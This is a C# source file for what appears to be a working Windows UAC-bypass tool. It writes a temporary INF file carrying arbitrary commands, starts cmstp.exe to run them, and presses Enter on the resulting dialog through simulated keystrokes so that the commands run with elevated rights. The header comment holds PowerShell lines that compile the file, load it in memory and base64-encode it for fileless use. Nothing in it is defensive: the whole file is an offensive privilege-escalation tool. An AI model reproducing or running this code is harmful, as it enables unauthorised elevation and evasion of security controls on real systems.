using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

/// <summary>
/// Add-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\ElevatedPrivileges.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "ElevatedPrivileges.dll"
/// [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\ElevatedPrivileges.dll"))
/// If (([Management.Automation.PSTypeName]'ElevatedPrivileges').Type) { [ElevatedPrivileges]::Invoke("C:\ScheduledTask\ScheduledTask.exe") }
/// [Convert]::ToBase64String((Get-Content -Path .\ElevatedPrivileges.dll -Encoding Byte))
/// [Reflection.Assembly]::Load([Convert]::FromBase64String("")) | Out-Null
/// </summary>
public class ElevatedPrivileges
{
    public enum CmdShow { SW_SHOW = 5 }
    public enum Message { WM_KEYDOWN = 0x0100, WM_KEYUP = 0x0101 }
    public enum KeyCodes { VK_RETURN = 0x0D }

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    public static extern IntPtr FindWindow(string className, string windowName);
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, CmdShow cmdShow);
    [DllImport("user32.dll")]
    public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")]
    public static extern int SendMessage(IntPtr hWnd, Message msg, KeyCodes wParam, int lParam = 0);

    public static string BuildServiceProfile(string cmdsHere)
    {
        var infFile = Path.GetRandomFileName().Split(new char[] { '.' })[0] + ".inf";
        var path = Path.Combine(Path.GetTempPath(), infFile);

        using (Stream stream = File.OpenWrite(path))
        using (StreamWriter writer = new StreamWriter(stream, Encoding.ASCII))
        {
            writer.Write(@"[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
%CommandsHere%
taskkill /im cmstp.exe /f
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
[Strings]
CommandsHere = ""{cmdsHere}""
UnexpectedError = ""An unexpected error occurred.  Please reboot and try the installation again.""
ServiceName=""ElevatedPrivileges""
ShortSvcName=""ed23c88e-8b38-4afe-be0f-cde578e23259""
".Replace("{cmdsHere}", cmdsHere));
        }

        return path;
    }

    public static bool FindWindow()
    {
        var hWnd = FindWindow("#32770", "ElevatedPrivileges");

        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
        {
            //SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
            //SendMessage(hWnd, Message.WM_KEYUP, KeyCodes.VK_RETURN);
            SendKeys.SendWait("{ENTER}");
            return true;
        }

        return false;
    }

    public static bool FindWindowByProcess()
    {
        var proc = Process.GetProcessesByName("cmstp").SingleOrDefault();

        if (proc == null)
        {
            return false;
        }

        proc.Refresh();
        var hWnd = proc.MainWindowHandle;

        if (hWnd != IntPtr.Zero && SetForegroundWindow(hWnd) && ShowWindow(hWnd, CmdShow.SW_SHOW))
        {
            //SendMessage(hWnd, Message.WM_KEYDOWN, KeyCodes.VK_RETURN);
            //SendMessage(hWnd, Message.WM_KEYUP, KeyCodes.VK_RETURN);
            SendKeys.SendWait("{ENTER}");
            return true;
        }

        return false;
    }

    public static bool Invoke(string cmdsHere)
    {
        var cmstp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");

        if (!File.Exists(cmstp))
        {
            return false;
        }

        var hWnd = IntPtr.Zero;
        var info = new ProcessStartInfo(cmstp);
        info.Arguments = @"/au """ + BuildServiceProfile(cmdsHere) + @"""";
        info.UseShellExecute = false;
        var proc = Process.Start(info);
        var sw = Stopwatch.StartNew();

        while (proc.MainWindowHandle == IntPtr.Zero)
        {
            if (proc.MainWindowHandle != IntPtr.Zero)
            {
                hWnd = proc.MainWindowHandle;
                break;
            }

            if (sw.Elapsed > TimeSpan.FromSeconds(5))
            {
                break;
            }
        }

        sw = Stopwatch.StartNew();

        while (!FindWindowByProcess())
        {
            if (sw.Elapsed > TimeSpan.FromSeconds(5))
            {
                break;
            }
        }

        proc.WaitForExit();
        return (proc.ExitCode == 0);
    }
}